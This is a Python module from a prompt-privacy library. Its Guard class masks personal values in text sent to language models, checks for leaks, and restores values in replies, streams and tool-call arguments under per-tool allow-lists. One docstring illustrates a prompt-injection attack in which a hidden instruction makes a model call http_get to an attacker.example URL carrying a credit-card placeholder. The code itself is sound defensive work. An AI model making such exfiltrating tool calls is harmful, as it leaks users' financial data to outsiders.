"""
A gate between your data and any language model, local or hosted.

:class:`Guard` is what an application, a script or an agent puts in front of
a model client. Everything that goes out is encoded and then *checked*;
everything that comes back is decoded — including streamed replies and the
arguments of tool calls. The model never sees a removed value, and the person
using it never sees a placeholder.

Notes
-----
**User notes.** Any client that takes text and returns text works, because
the guard only needs a callable::

    from scikitplot.cleanprompt import FluentCleanPrompt

    guard = FluentCleanPrompt().packs("patient").guard()


    def call_model(prompt: str) -> str:  # your client: any vendor, any SDK
        return client.complete(prompt)


    answer = guard.ask("Summarise the visit of MRN: 00412345", call_model)

Chat-style clients take a list of messages, and every message is guarded —
system prompts and earlier turns included::

    reply = guard.chat(messages, call_chat)

Agents call tools with arguments the model wrote, and tools return data the
model should not see. Both directions have a method::

    args = guard.decode_tool_arguments(
        tool_call.arguments, allow={"EMAIL"}
    )  # least privilege
    result = run_tool(**args)  # runs with the real values
    safe = guard.encode_object(result)  # values -> placeholders, for the model

Streaming replies are decoded chunk by chunk without ever splitting a label::

    for text in guard.decode_stream(client.stream(guard.outgoing(prompt))):
        print(text, end="")

Asynchronous clients — most current SDKs and agent frameworks — have the same
four operations::

    answer = await guard.aask(prompt, call_model_async)
    reply = await guard.achat(messages, call_chat_async)
    async for text in guard.adecode_stream(client.astream(guard.outgoing(prompt))):
        print(text, end="")

**Developer notes — three rules this module exists to keep.**

*Fail closed.* :meth:`Guard.outgoing` encodes and then runs an independent
check (:meth:`~scikitplot.cleanprompt.Cleaner.leaks`) for any removed value
still present. If one is, :class:`~scikitplot.cleanprompt.LeakError` is raised
*before* the caller's function is invoked, so the model cannot receive it. The
check is a different mechanism from encoding — a literal search for the removed
values, not detection — so one defect cannot pass both.

*The caller owns the network.* Nothing here opens a socket, imports a vendor
SDK or reads an API key. A guard is pure local computation around a callable,
which is what makes it usable with every model, and what keeps this submodule
standard-library only.

*Decoding a stream is exactly decoding the whole.* :class:`StreamDecoder`
holds back only the tail of the buffer that could still become a label, and
the test suite checks that every chunking of a reply decodes to the same text
as the reply decoded at once.

See Also
--------
scikitplot.cleanprompt._runtime.Cleaner : What a guard encodes and decodes with.
"""

from __future__ import annotations

import inspect
import json
from collections.abc import (
    AsyncIterable,
    AsyncIterator,
    Awaitable,
    Callable,
    Iterable,
    Iterator,
    Mapping,
    Sequence,
)
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    # Annotations are strings under ``from __future__ import annotations``, so
    # ``Self`` is needed only by a type checker. Importing it at runtime made
    # the base tier depend on typing_extensions, which Python 3.11+ does not
    # ship and nothing here declares (CP-054).
    from typing_extensions import Self

from ._canonical import normal_form
from ._engine import RESTORE_MAX_GAP, _restoration_candidates
from ._exceptions import CleanPromptError, LeakError
from ._logging import audit
from ._runtime import Cleaner

__all__ = [
    "Guard",
    "StreamDecoder",
]

#: Keys of a chat message that hold tool calls, left encoded by
#: :meth:`Guard.chat` (``CP-073``).
_TOOL_CALL_KEYS = frozenset({"tool_calls", "function_call"})

#: Content-part types that are tool calls, left encoded by :meth:`Guard.chat`.
_TOOL_CALL_PARTS = frozenset({"tool_use", "server_tool_use", "function_call"})

#: Longest bracket label a stream decoder waits for, in characters. A
#: canonical label is under thirty; the margin admits a model's rewritten
#: spellings (spaces, a line break) that lenient restoration repairs.
MAX_LABEL = 64


class StreamDecoder:
    """
    Decode a model's reply as it streams in, never splitting a label.

    Parameters
    ----------
    guard : Guard
        Supplies the vault and the placeholder grammar.

    Notes
    -----
    **User notes.** Call :meth:`feed` with each chunk and print what it
    returns; call :meth:`flush` once at the end. The text you print is exactly
    what decoding the whole reply at once would give.

    **Developer notes.** Two things can be cut by a chunk boundary: a bracket
    label (``[EMA`` | ``IL-1]``) and a literal stand-in (``Marion`` |
    ``Holt``, or ``id_1`` | ``0`` where ``id_10`` is also a stand-in). The
    decoder emits everything before the earliest point where either could
    still be in progress, and keeps the rest:

    - from the last unclosed opening delimiter within :data:`MAX_LABEL`
      characters, including a backslash escaping it;
    - the longest tail of the buffer that is a proper prefix of a literal
      stand-in, or a whole stand-in that is also a prefix of a longer one.

    Everything emitted is decoded with the same function as a whole reply.
    """

    __slots__ = ("_buffer", "_guard", "_prefixes", "_reach", "_starts", "_vault_size")

    def __init__(self, guard: Guard) -> None:
        self._guard = guard
        self._buffer = ""
        self._prefixes: frozenset[str] = frozenset()
        self._reach = 0
        self._starts: frozenset[str] = frozenset()
        self._vault_size = -1

    def _literal_prefixes(self) -> frozenset[str]:
        """Return every prefix of every literal stand-in that may still grow."""
        cleaner = self._guard.cleaner
        if len(cleaner) == self._vault_size:
            return self._prefixes
        style = cleaner.policy.tag_style
        literals = [
            label
            for label in cleaner.vault().labels()
            if style.normalize(label) is None
        ]
        # Prefixes are compared in normal form, because a stand-in the model
        # re-cased or re-spaced is restored too (CP-072). The reach is the
        # longest writing restoration accepts: every word gap at its bound.
        forms = [normal_form(label) for label in literals]
        prefixes = set()
        for form in forms:
            prefixes.update(form[:cut] for cut in range(1, len(form)))
        # A complete stand-in that begins a longer one may still become it.
        prefixes.update(
            form
            for form in forms
            if any(o != form and o.startswith(form) for o in forms)
        )
        self._starts = frozenset(form[:1] for form in forms if form)
        self._reach = max(
            (
                len(f) + f.count(" ") * (RESTORE_MAX_GAP - 1) + RESTORE_MAX_GAP
                for f in forms
            ),
            default=0,
        )
        self._prefixes = frozenset(prefixes)
        self._vault_size = len(cleaner)
        return self._prefixes

    def _hold(self) -> int:
        """
        Return where the undecidable tail of the buffer begins.

        Notes
        -----
        **Developer notes.** Three constraints, applied until none moves the
        cut: the tail that could still grow into a bracket label; the tail that
        could still grow into a literal stand-in; and no restoration candidate
        found in the buffer may straddle the cut. The third is what the first
        version missed — a complete stand-in ending the buffer could be cut
        one character short by a shorter stand-in's prefix, and the emitted
        half was then never restored (caught by the chunking property test).
        """
        text = self._buffer
        cut = len(text)
        style = self._guard.cleaner.policy.tag_style
        opening = text.rfind(style.prefix, max(0, len(text) - MAX_LABEL))
        if opening != -1 and text.find(style.suffix, opening + len(style.prefix)) == -1:
            cut = opening - 1 if opening > 0 and text[opening - 1] == "\\" else opening
        elif text.endswith("\\"):
            cut = len(text) - 1
        prefixes = self._literal_prefixes()
        if prefixes:
            for size in range(min(self._reach, len(text)), 0, -1):
                tail = text[-size:]
                # Most positions cannot begin a stand-in; test one character
                # before normalising the whole tail.
                if normal_form(tail[:1])[:1] not in self._starts:
                    continue
                if normal_form(tail) in prefixes:
                    cut = min(cut, len(text) - size)
                    break
        spans = [
            (start, end)
            for start, end, _ in _restoration_candidates(
                text, self._guard.cleaner.vault(), style, style.lenient_pattern()
            )
        ]
        moved = True
        while moved:
            moved = False
            for start, end in spans:
                if start < cut < end:
                    cut, moved = start, True
        return cut

    def feed(self, chunk: str) -> str:
        """
        Add a chunk and return the decoded text that is now certain.

        Parameters
        ----------
        chunk : str
            The next piece of the reply.

        Returns
        -------
        str
            Decoded text; possibly empty while a label is incomplete.

        Raises
        ------
        TypeError
            If ``chunk`` is not a string.
        """
        if not isinstance(chunk, str):
            raise TypeError(f"chunk must be str, got {type(chunk).__name__!r}")
        self._buffer += chunk
        cut = self._hold()
        ready, self._buffer = self._buffer[:cut], self._buffer[cut:]
        return self._guard.cleaner.decode(ready) if ready else ""

    def flush(self) -> str:
        """
        Return the decoded remainder and reset.

        Returns
        -------
        str
            Whatever was held back, decoded.
        """
        rest, self._buffer = self._buffer, ""
        return self._guard.cleaner.decode(rest) if rest else ""


class Guard:
    """
    Encode what goes to a model, check it, and decode what comes back.

    Parameters
    ----------
    cleaner : Cleaner, optional
        Defaults to ``Cleaner()`` — packs chosen by format, placeholders,
        ``remember`` on.
    format : str, default='text'
        How prompt text is read. Use ``'markdown'`` for Markdown prompts, or
        any other text format the cleaner's plan selects.
    verify : bool, default=True
        Run the independent leak check on everything outgoing, and refuse to
        send on a finding.

    Notes
    -----
    **User notes.** One guard is one conversation: a value keeps its
    placeholder for every turn, and the vault is cleared when the ``with``
    block ends. Nothing about the guard needs the network; you pass the
    function that calls the model.

    Examples
    --------
    >>> from scikitplot.cleanprompt import FluentCleanPrompt
    >>> with FluentCleanPrompt().guard() as guard:
    ...     guard.ask(
    ...         "Write to ann@example.com", lambda safe: "Sent to " + safe.split()[-1]
    ...     )
    'Sent to ann@example.com'
    """

    __slots__ = ("_cleaner", "_format", "_verify")

    def __init__(
        self, cleaner: Cleaner | None = None, format: str = "text", verify: bool = True
    ) -> None:  # noqa: A002 - public keyword
        self._cleaner = cleaner if cleaner is not None else Cleaner()
        self._format = format
        self._verify = bool(verify)
        # Fail at construction, not at the first message, if the format is
        # not one the plan reads as text.
        self._cleaner.text_format(format)

    @property
    def cleaner(self) -> Cleaner:
        """Cleaner: The cleaner holding this conversation's values."""
        return self._cleaner

    def __repr__(self) -> str:
        return (
            f"Guard({self._cleaner!r}, format={self._format!r}, verify={self._verify})"
        )

    def __enter__(self) -> Self:
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        self.clear()

    def clear(self) -> None:
        """Drop every value; the guard cannot be used afterwards."""
        self._cleaner.clear()

    # -- outgoing ---------------------------------------------------------

    def outgoing(  # noqa: A002 - public keyword
        self,
        text: str,
        format: str | None = None,
    ) -> str:
        """
        Return ``text`` safe to send, or raise before anything is sent.

        Parameters
        ----------
        text : str
            A prompt, a message, a tool result.
        format : str, optional
            Overrides the guard's format for this text.

        Returns
        -------
        str
            The encoded text.

        Raises
        ------
        LeakError
            If the independent check finds a removed value still present.
        CleanPromptError
            If the text cannot be read as its format.
        """
        # Encode and check as one step: another thread must not add a value
        # between them (CP-067). The cleaner's lock is re-entrant.
        with self._cleaner._lock:  # noqa: SLF001 - same package, one invariant
            safe = self._cleaner.encode_text(text, format or self._format).text
            kinds = self._cleaner.leaks(safe) if self._verify else ()
        if kinds:
            audit("blocked", values=len(kinds), kinds=sorted(set(kinds)))
            msg = (
                f"refused to send: {len(kinds)} removed value(s) of kind "
                f"{', '.join(sorted(set(kinds)))} still occur in the outgoing text. "
                "Keep remember() on, or hide them with hide()."
            )
            raise LeakError(msg, kinds=kinds)
        return safe

    def encode_object(self, value: Any) -> Any:
        """
        Return a JSON-like value guarded as the JSON document it will become.

        Parameters
        ----------
        value : object
            A tool result or any structure of dicts, lists, strings, numbers,
            booleans and ``None``. A bare string is guarded as text.

        Returns
        -------
        object
            The value as :func:`json.loads` reads the guarded document: keys,
            strings and numbers under sensitive field names are encoded, and
            every one is checked. Tuples become lists and non-string keys
            become strings, as in any JSON the model receives.

        Raises
        ------
        TypeError
            If the structure holds a type JSON cannot carry — refused rather
            than converted, so nothing is sent in a form nobody inspected.
        ValueError
            If it holds ``NaN`` or an infinity, which JSON cannot carry.
        LeakError
            As :meth:`outgoing`.
        CleanPromptError
            If this guard's plan does not select the ``json`` format.

        Notes
        -----
        **Developer notes — why the whole structure, not string by string
        (``CP-076``, ``CP-077``).** Walking the structure and guarding each
        string left two things unread: mapping *keys*, so a result keyed by
        email address sent every address, and *numbers*, so a card or phone
        number stored as an integer went out as it was. Serialising once and
        guarding the document with the ``json`` format reads keys, gives a
        number under a sensitive field a numeric stand-in that keeps the JSON
        valid, reads ``Key: value`` prose inside strings (``CP-078``), and puts
        the whole document through the independent check.

        Examples
        --------
        >>> from scikitplot.cleanprompt import FluentCleanPrompt
        >>> guard = FluentCleanPrompt().guard()
        >>> guard.encode_object({"ann@example.com": {"card": 4242424242424242}})
        {'[EMAIL-1]': {'card': -9900000001}}
        """
        if isinstance(value, str):
            return self.outgoing(value)
        try:
            document = json.dumps(value, ensure_ascii=False, allow_nan=False)
        except TypeError as exc:
            raise TypeError(
                f"cannot guard this value: {exc}; convert it to JSON types first"
            ) from exc
        except ValueError as exc:
            raise ValueError(
                "cannot guard NaN or an infinity: JSON cannot carry them"
            ) from exc
        return json.loads(self.outgoing(document, "json"))

    # -- incoming ---------------------------------------------------------

    def incoming(self, reply: str, strict: bool = False) -> str:
        """
        Put the values back into a model's reply.

        Parameters
        ----------
        reply : str
            The model's text.
        strict : bool, default=False
            Raise on a placeholder this guard never issued.

        Returns
        -------
        str
            The restored text.
        """
        if not isinstance(reply, str):
            raise TypeError(f"reply must be str, got {type(reply).__name__!r}")
        return self._cleaner.decode(reply, strict=strict)

    def decode_object(self, value: Any) -> Any:
        """
        Return a JSON-like value with every string decoded.

        Parameters
        ----------
        value : object
            Tool-call arguments as a model wrote them — a mapping, a list, or
            a JSON string of either.

        Returns
        -------
        object
            The same shape with values restored. A JSON string comes back as
            the decoded JSON string.
        """
        if isinstance(value, str):
            stripped = value.strip()
            if stripped[:1] in ("{", "["):
                try:
                    parsed = json.loads(value)
                except ValueError:
                    return self.incoming(value)
                return json.dumps(self.decode_object(parsed), ensure_ascii=False)
            return self.incoming(value)
        if isinstance(value, Mapping):
            return {key: self.decode_object(item) for key, item in value.items()}
        if isinstance(value, (list, tuple)):
            return [self.decode_object(item) for item in value]
        return value

    def decode_tool_arguments(
        self,
        arguments: Any,
        *,
        allow: Iterable[str] | str,
        on_withheld: str = "raise",
    ) -> Any:
        """
        Restore a tool call's arguments with only the values this tool may get.

        Parameters
        ----------
        arguments : object
            The arguments as the model wrote them — a mapping, a list, or a
            JSON string of either (as :meth:`decode_object` takes them).
        allow : iterable of str, or ``"all"``
            The value kinds this tool may receive, for example ``{"EMAIL"}``
            for a tool that sends mail, or ``()`` for one that fetches a URL.
            ``"all"`` restores every kind and must be asked for explicitly.
        on_withheld : {'raise', 'keep'}, default='raise'
            What to do when the arguments name a value of another kind:
            refuse the call, or pass that placeholder through unrestored.

        Returns
        -------
        object
            The arguments in the same shape, with allowed values restored.

        Raises
        ------
        LeakError
            With ``on_withheld='raise'``, if the arguments name a value of a
            kind not in ``allow``. Nothing is restored and the tool must not
            run.
        ValueError
            If ``allow`` or ``on_withheld`` is not one of the accepted forms.

        Notes
        -----
        **User notes.** A tool call is where decoded values leave again. An
        instruction hidden in a page the model read can ask it to call
        ``http_get("https://attacker.example/?c=[CREDIT_CARD-1]")``; the model
        never saw the number, but restoring every placeholder would hand it to
        the request. Give each tool the kinds it needs and no more — a
        network tool usually needs none.

        **Developer notes.** Which kinds the arguments name is decided by
        :meth:`Cleaner.kinds_in`, the same restoration that decoding runs, so
        the check and the decode cannot disagree (``CP-073``).

        Examples
        --------
        >>> from scikitplot.cleanprompt import FluentCleanPrompt, LeakError
        >>> guard = FluentCleanPrompt().guard()
        >>> _ = guard.outgoing("mail ann@example.com, card 4242 4242 4242 4242")
        >>> guard.decode_tool_arguments({"to": "[EMAIL-1]"}, allow={"EMAIL"})
        {'to': 'ann@example.com'}
        >>> try:
        ...     guard.decode_tool_arguments({"url": "x?c=[CREDIT_CARD-1]"}, allow=())
        ... except LeakError as error:
        ...     print(error.kinds)
        ('CREDIT_CARD',)
        """
        if on_withheld not in ("raise", "keep"):
            raise ValueError(
                f"on_withheld must be 'raise' or 'keep', got {on_withheld!r}"
            )
        if isinstance(allow, str):
            if allow != "all":
                raise ValueError(
                    f"allow must be an iterable of kinds or 'all', got {allow!r}; "
                    "write {'EMAIL'}, not 'EMAIL'"
                )
            kinds = None
        else:
            kinds = frozenset(allow)
            bad = sorted(repr(kind) for kind in kinds if not isinstance(kind, str))
            if bad:
                raise ValueError(f"allow must contain kind names, got {', '.join(bad)}")
        if kinds is not None:
            named = {
                kind
                for text in _strings(arguments)
                for kind in self._cleaner.kinds_in(text)
            }
            withheld = sorted(set(named) - kinds)
            if withheld:
                audit("withheld", values=len(withheld), kinds=withheld)
                if on_withheld == "raise":
                    msg = (
                        f"refused a tool call: its arguments name {len(withheld)} value(s) "
                        f"of kind {', '.join(withheld)}, which this tool is not allowed; "
                        "add the kind to allow= if the tool needs it"
                    )
                    raise LeakError(msg, kinds=tuple(withheld))
        return self._decode_value(arguments, kinds)

    def _decode_value(self, value: Any, kinds: frozenset[str] | None) -> Any:
        """Decode every string in a JSON-like value, restoring only ``kinds``."""
        if isinstance(value, str):
            stripped = value.strip()
            if stripped[:1] in ("{", "["):
                try:
                    parsed = json.loads(value)
                except ValueError:
                    return self._cleaner.decode_report(value, kinds=kinds).text
                return json.dumps(self._decode_value(parsed, kinds), ensure_ascii=False)
            return self._cleaner.decode_report(value, kinds=kinds).text
        if isinstance(value, Mapping):
            return {key: self._decode_value(item, kinds) for key, item in value.items()}
        if isinstance(value, (list, tuple)):
            return [self._decode_value(item, kinds) for item in value]
        return value

    def stream(self) -> StreamDecoder:
        """
        Return a decoder for one streamed reply.

        Returns
        -------
        StreamDecoder
            Feed it chunks; flush it once.
        """
        return StreamDecoder(self)

    def decode_stream(self, chunks: Iterable[str]) -> Iterator[str]:
        """
        Decode a streamed reply, chunk by chunk.

        Parameters
        ----------
        chunks : iterable of str
            The reply as the client streams it.

        Yields
        ------
        str
            Decoded text, never empty; joined, it equals the whole reply
            decoded at once.

        Raises
        ------
        TypeError
            If a chunk is not a string.

        Examples
        --------
        >>> from scikitplot.cleanprompt import FluentCleanPrompt
        >>> guard = FluentCleanPrompt().guard()
        >>> safe = guard.outgoing("mail ann@example.com")
        >>> "".join(guard.decode_stream(["mail [EMA", "IL-1]"]))
        'mail ann@example.com'
        """
        decoder = self.stream()
        for chunk in chunks:
            piece = decoder.feed(_chunk(chunk))
            if piece:
                yield piece
        rest = decoder.flush()
        if rest:
            yield rest

    async def adecode_stream(self, chunks: AsyncIterable[str]) -> AsyncIterator[str]:
        """
        Decode a reply streamed by an asynchronous client.

        Parameters
        ----------
        chunks : async iterable of str
            The reply as the client streams it.

        Yields
        ------
        str
            As :meth:`decode_stream`.

        Raises
        ------
        TypeError
            If a chunk is not a string.
        """
        decoder = self.stream()
        async for chunk in chunks:
            piece = decoder.feed(_chunk(chunk))
            if piece:
                yield piece
        rest = decoder.flush()
        if rest:
            yield rest

    # -- round trips -------------------------------------------------------

    def ask(self, prompt: str, call: Callable[[str], str]) -> str:
        """
        Guard ``prompt``, pass it to ``call``, and decode the answer.

        Parameters
        ----------
        prompt : str
            What you would have sent.
        call : callable
            Takes the safe prompt, returns the model's text.

        Returns
        -------
        str
            The decoded answer.

        Raises
        ------
        LeakError
            Before ``call`` is invoked, if the check fails.
        TypeError
            If ``call`` does not return a string.
        """
        return self._answer(call(self.outgoing(prompt)))

    async def aask(self, prompt: str, call: Callable[[str], Awaitable[str]]) -> str:
        """
        Guard ``prompt``, await ``call`` with it, and decode the answer.

        Parameters
        ----------
        prompt : str
            What you would have sent.
        call : callable
            An ``async`` function taking the safe prompt and returning the
            model's text.

        Returns
        -------
        str
            The decoded answer.

        Raises
        ------
        LeakError
            Before ``call`` is invoked, if the check fails.
        TypeError
            If ``call`` does not return an awaitable, or it does not resolve
            to a string.

        Notes
        -----
        **User notes.** Encoding runs in the calling thread; it is fast for a
        prompt. For a large document, ``await asyncio.to_thread(guard.outgoing,
        text)`` first — a guard is safe to share across threads (``CP-067``).
        """
        return self._answer(await _awaited(call(self.outgoing(prompt))))

    def _answer(self, answer: Any) -> str:
        """Decode a model's text answer, refusing anything else."""
        if not isinstance(answer, str):
            raise TypeError(
                f"the model call must return str, got {type(answer).__name__!r}"
            )
        return self.incoming(answer)

    def chat(
        self,
        messages: Sequence[Mapping[str, Any]],
        call: Callable[[list[dict[str, Any]]], Any],
    ) -> Any:
        """
        Guard every message, pass them to ``call``, and decode the reply.

        Parameters
        ----------
        messages : sequence of mapping
            Chat messages. ``content`` may be a string or a list of parts; a
            part's ``text`` is guarded. Other keys are copied unchanged.
        call : callable
            Takes the guarded messages; returns a string or a message mapping.

        Returns
        -------
        str or dict
            The reply, decoded, in the shape ``call`` returned.

        Raises
        ------
        LeakError
            Before ``call`` is invoked, if any message fails the check.
        CleanPromptError
            If a message has content of an unsupported shape.
        """
        return self._reply(call(self._messages(messages)))

    async def achat(
        self,
        messages: Sequence[Mapping[str, Any]],
        call: Callable[[list[dict[str, Any]]], Awaitable[Any]],
    ) -> Any:
        """
        Guard every message, await ``call`` with them, and decode the reply.

        Parameters
        ----------
        messages : sequence of mapping
            As :meth:`chat`.
        call : callable
            An ``async`` function taking the guarded messages and returning a
            string or a message mapping.

        Returns
        -------
        str or dict
            The reply, decoded, in the shape ``call`` returned.

        Raises
        ------
        LeakError
            Before ``call`` is invoked, if any message fails the check.
        TypeError
            If ``call`` does not return an awaitable of a string or mapping.
        """
        return self._reply(await _awaited(call(self._messages(messages))))

    def _messages(self, messages: Sequence[Mapping[str, Any]]) -> list[dict[str, Any]]:
        """Guard every message before any is sent."""
        return [self._message(message) for message in messages]

    def _reply(self, reply: Any) -> Any:
        """
        Decode a chat reply in the shape the client returned it.

        Notes
        -----
        **Developer notes.** Text is decoded; tool calls are not
        (``CP-073``). OpenAI-style ``tool_calls`` and ``function_call``, and
        Anthropic-style ``tool_use`` content blocks, come back exactly as the
        model wrote them, so their arguments reach a tool only through
        :meth:`decode_tool_arguments` and its allow-list.
        """
        if isinstance(reply, str):
            return self.incoming(reply)
        if isinstance(reply, Mapping):
            out = {}
            for key, item in reply.items():
                if key in _TOOL_CALL_KEYS:
                    out[key] = item
                elif key == "content" and isinstance(item, list):
                    out[key] = [
                        (
                            part
                            if isinstance(part, Mapping)
                            and part.get("type") in _TOOL_CALL_PARTS
                            else self.decode_object(part)
                        )
                        for part in item
                    ]
                else:
                    out[key] = self.decode_object(item)
            return out
        raise TypeError(
            f"the model call must return str or a mapping, got {type(reply).__name__!r}"
        )

    def _message(self, message: Mapping[str, Any]) -> dict[str, Any]:
        """Return one chat message with its text guarded."""
        if not isinstance(message, Mapping):
            raise CleanPromptError(
                f"a chat message must be a mapping, got {type(message).__name__}"
            )
        out = dict(message)
        content = message.get("content")
        if isinstance(content, str):
            out["content"] = self.outgoing(content)
        elif isinstance(content, list):
            parts = []
            for part in content:
                if isinstance(part, Mapping) and isinstance(part.get("text"), str):
                    part = {  # ruff: ignore[redefined-loop-name]
                        **part,
                        "text": self.outgoing(part["text"]),
                    }
                elif isinstance(part, Mapping) and part.get("type") not in (
                    None,
                    "text",
                ):
                    msg = (
                        f"a {part.get('type')!r} content part cannot be inspected, so it is not sent; "
                        "remove it or convert it to text"
                    )
                    raise CleanPromptError(msg)
                parts.append(part)
            out["content"] = parts
        elif content is not None:
            raise CleanPromptError(
                f"message content of type {type(content).__name__} cannot be guarded"
            )
        return out


def _chunk(chunk: Any) -> str:
    """Return a streamed chunk, refusing anything but text."""
    if not isinstance(chunk, str):
        raise TypeError(f"a streamed chunk must be str, got {type(chunk).__name__!r}")
    return chunk


async def _awaited(result: Any) -> Any:
    """
    Await what an ``async`` model call returned.

    Notes
    -----
    **Developer notes.** A plain function passed to :meth:`Guard.aask` returns
    its answer directly; awaiting a string would fail with an error that
    names neither the guard nor the fix, so the shape is checked first.
    """
    if not inspect.isawaitable(result):
        raise TypeError(
            f"an async model call must return an awaitable, got {type(result).__name__!r}; "
            "use ask() or chat() for a plain function"
        )
    return await result


def _strings(value: Any) -> Iterator[str]:
    """
    Yield every string a JSON-like value holds, as the decoder will see it.

    Notes
    -----
    **Developer notes.** Walks exactly as :meth:`Guard._decode_value`
    decodes — a JSON string is parsed and walked, anything else is one
    string — so the allow-list check reads the same text the decoder
    restores (``CP-073``).
    """
    if isinstance(value, str):
        if value.strip()[:1] in ("{", "["):
            try:
                parsed = json.loads(value)
            except ValueError:
                yield value
                return
            yield from _strings(parsed)
            return
        yield value
    elif isinstance(value, Mapping):
        for item in value.values():
            yield from _strings(item)
    elif isinstance(value, (list, tuple)):
        for item in value:
            yield from _strings(item)
